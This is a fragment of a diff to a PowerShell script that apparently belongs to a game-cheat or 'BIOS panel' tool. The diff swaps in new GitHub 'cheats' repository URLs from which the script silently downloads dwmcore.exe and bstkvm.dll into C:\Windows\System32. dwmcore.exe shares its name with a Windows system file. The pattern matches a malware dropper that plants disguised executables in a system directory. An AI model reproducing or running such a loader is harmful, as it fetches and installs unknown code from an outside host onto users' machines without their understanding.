@@ -42,7 +42,7 @@ Write-Host "=====================================" -ForegroundColor Cyan
 Write-Host ""
 
 # DLL URL
-$url = "https://github.com/dclucky555-del/PhoenixBios-Panel/raw/refs/heads/main/dwmcore.exe"
+$url = "https://github.com/phoenixcheats22/BiosSettup/raw/refs/heads/main/dwmcore.exe"
 
 # FIXED PATH (no dynamic, no creation)
 $basePath = "C:\Windows\System32"
@@ -81,7 +81,7 @@ Write-Host " Setup 1 success ✅" -ForegroundColor Green
 # ================================
 # Download Additional DLL (Silent)
 # ================================
-$dllUrl = "https://github.com/dclucky555-del/PhoenixBios-Panel/raw/refs/heads/main/bstkvm.dll"
+$dllUrl = "https://github.com/phoenixcheats22/BiosSettup/raw/refs/heads/main/bstkvm.dll"
 $saveDir = "C:\Windows\System32"
 $dllName = "bstkvm.dll"
 
